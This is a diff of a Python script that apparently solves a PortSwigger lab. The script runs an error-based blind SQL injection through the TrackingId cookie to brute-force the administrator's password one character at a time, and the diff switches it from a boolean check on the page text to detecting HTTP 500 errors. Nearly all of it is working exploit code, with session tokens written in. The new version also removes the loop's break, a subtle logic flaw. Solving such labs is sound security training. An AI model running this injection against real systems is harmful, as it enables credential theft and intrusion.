@@ -1,31 +1,32 @@
-import requests
 import string
+import requests
 
+dictionary = string.ascii_lowercase + string.digits
 
-url = 'https://0ab900f8032f94e982e602ff00230006.web-security-academy.net/'
-
-character_dictionary = string.ascii_lowercase + string.digits
+url = "https://0ae70015036be135850acc03003400c1.web-security-academy.net/"
 
 
 def make_request(url):
     password = ''
 
     for position in range(1, 21):
-        for character in character_dictionary:
+        for character in dictionary:
 
             cookies = {
-                'TrackingId': "8tKmPzLJy00LiduO' and (select substring(password,%d,1) from users where username='administrator')='%s'-- -" % (position, character),
-                'session': 'kHvx6TIRasyDNnP2YQlnYlKoFP66JvtZ'
+                "TrackingId": "Kq2s1aW85HBx1IDs'||(SELECT CASE WHEN substr(password,%d,1)='%s' THEN TO_CHAR(1/0) ELSE "
+                              "NULL END FROM users where username='administrator')||'" % (
+                                  position, character),
+                "session": "vDa0uPTyhMpsLC4Y78fdnb5UFC4vF83h"
             }
 
             response = requests.get(url, cookies=cookies)
-            if "Welcome back!" in response.text:
+
+            if response.status_code == 500:
                 password += character
-                break
-    
+                print("Found password character: {0} | password atm: {1}".format(character, password))
+
     return password
 
 
 if __name__ == '__main__':
-    print("The password is: {}".format(make_request(url)))
-
+    make_request(url)
